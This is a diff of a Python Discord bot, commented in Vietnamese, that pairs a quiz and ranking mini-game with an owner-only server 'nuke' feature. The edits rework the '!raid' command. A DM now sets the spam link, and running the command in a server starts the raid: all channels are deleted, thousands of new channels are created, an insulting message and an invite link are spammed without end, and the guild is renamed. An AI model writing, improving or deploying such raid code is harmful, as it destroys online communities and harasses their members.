@@ -14,14 +14,13 @@ OWNER_ID = 1413781843030966345
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
 BATCH_SIZE = 80
-SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"
+SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"  # Link mặc định
 SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
 NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"
 
 # ===== CẤU HÌNH MINI GAME =====
 DATA_FILE = "rankings.json"
 QUIZ_DURATION = 30
-SAVED_INVITE_FILE = "saved_invite.txt"
 
 # ===== HỆ THỐNG RANK =====
 RANK_IMAGES = {
@@ -84,19 +83,6 @@ def save_rankings(data):
         json.dump(data, f, ensure_ascii=False, indent=4)
 
 rankings = load_rankings()
-
-# ===== LƯU LINK MỜI =====
-def load_saved_invite():
-    if os.path.exists(SAVED_INVITE_FILE):
-        with open(SAVED_INVITE_FILE, "r", encoding="utf-8") as f:
-            return f.read().strip()
-    return None
-
-def save_saved_invite(link):
-    with open(SAVED_INVITE_FILE, "w", encoding="utf-8") as f:
-        f.write(link)
-
-saved_invite = load_saved_invite()
 
 # ===== 200+ CÂU HỎI CÓ ĐÁP ÁN CỤ THỂ =====
 QUESTIONS = [
@@ -353,6 +339,7 @@ async def delete_all_channels(guild):
             pass
 
 async def create_channels_and_spam(guild):
+    global SPAM_LINK
     total_created = 0
     for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
         batch_tasks = []
@@ -372,6 +359,7 @@ async def create_channels_and_spam(guild):
         await asyncio.sleep(0.05)
 
 async def continuous_spam(guild):
+    global SPAM_LINK
     while True:
         channels = list(guild.text_channels)
         if not channels:
@@ -392,16 +380,6 @@ async def raid(guild):
     asyncio.create_task(create_channels_and_spam(guild))
     asyncio.create_task(continuous_spam(guild))
 
-# ===== THAM GIA SERVER BẰNG LINK LƯU =====
-async def join_server_from_invite(link):
-    global saved_invite
-    try:
-        code = link.split('/')[-1]
-        await client.accept_invite(code)
-        return True
-    except:
-        return False
-
 # ===== SỰ KIỆN =====
 @client.event
 async def on_ready():
@@ -416,8 +394,6 @@ async def on_ready():
     print("[*] Slash commands synced.")
     for guild in client.guilds:
         print(f"[*] Connected to: {guild.name} (ID: {guild.id})")
-    if saved_invite:
-        print(f"[*] Saved invite link found: {saved_invite}")
 
 @client.event
 async def on_guild_join(guild):
@@ -425,36 +401,30 @@ async def on_guild_join(guild):
 
 @client.event
 async def on_message(message):
+    global SPAM_LINK
     if message.author.id == client.user.id:
         return
     if message.author.id != OWNER_ID:
         return
 
+    # Xử lý lệnh !raid trong DM và server
     if message.content.startswith("!raid"):
         parts = message.content.split()
-        if len(parts) > 1:
-            # Lưu link mới
-            global saved_invite
-            saved_invite = parts[1]
-            save_saved_invite(saved_invite)
-            await message.channel.send("✅ Đã lưu link mời!")
-        else:
-            # Dùng link đã lưu để nuke
-            if saved_invite:
-                # Tham gia server từ link đã lưu
-                joined = await join_server_from_invite(saved_invite)
-                if joined:
-                    if client.guilds:
-                        guild = client.guilds[-1]  # Lấy server mới nhất
-                        await raid(guild)
-                        await message.channel.send("✅ Đã tham gia và nuke server!")
-                    else:
-                        await message.channel.send("❌ Không tìm thấy server vừa tham gia.")
-                else:
-                    await message.channel.send("❌ Link mời không hợp lệ hoặc đã hết hạn.")
+        if not message.guild and len(parts) > 1:
+            # DM: lưu link spam mới
+            new_link = parts[1]
+            if new_link.startswith(("http://", "https://")):
+                SPAM_LINK = new_link
+                await message.channel.send(f"✅ Đã cập nhật link spam thành: {SPAM_LINK}")
             else:
-                await message.channel.send("❌ Chưa có link mời. Hãy gửi !raid <link> để lưu.")
-    
+                await message.channel.send("❌ Link không hợp lệ. Hãy gửi link bắt đầu bằng http:// hoặc https://")
+        elif message.guild:
+            # Server: nuke server này với link đã lưu
+            await raid(message.guild)
+            await message.channel.send("✅ NUKE STARTED (spam link đã lưu)")
+        else:
+            await message.channel.send("❌ Hãy gửi !raid <link> trong DM để cập nhật link spam.")
+
     elif message.content.lower() == "!stop":
         sys.exit(0)
 
